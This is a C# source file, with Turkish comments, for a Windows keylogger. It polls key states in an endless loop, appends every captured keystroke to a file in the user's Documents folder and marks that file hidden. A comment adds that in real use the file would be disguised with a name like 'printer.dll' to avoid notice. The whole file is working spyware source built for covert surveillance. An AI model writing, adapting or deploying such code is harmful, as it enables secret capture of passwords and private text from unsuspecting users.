using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Keylogger
{
    internal class Program
    {

        [DllImport("User32.dll")] //GetAsyncKeyState komutu için gerekli olan dll komutu
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {

            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); //Çıktının kaydedileceği konum
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }


            string path = (filepath + @"\keylogger.txt"); // gerçek kullanımda txt yerine printer.dll
                                                          // gibi bir uzantı ile kullanırım anlaşılmamması için
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) // dosya silinse bile tekrar oluşturulması sağlandı
                {

                }
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden); // dosyayı gizli hale getirir. Bu satırı yorum satırı
                                                                                        // yaparak veya gizli öğeleri göster diyerek çıktıyı görebiliriz


            while (true)
            {
                Thread.Sleep(1); // bunu artırırsam bazen bastığım karakterleri algılamıyor o nedenle düşük tuttum
                for (int i = 32;  i<127; i++)
                {
                    int Keystate = GetAsyncKeyState(i); // bütün harfleri programa tanıtıyoruz
                    if (Keystate == 32769) 
                    {
                        Console.Write((char) i + ", ");

                        using (StreamWriter sw = File.AppendText(path)) // bu kısımlarda sayıları harflere çeviriyoruz
                        {
                            sw.Write((char) i);
                        }
                    }
                    
                }
            }
        }
    }
}
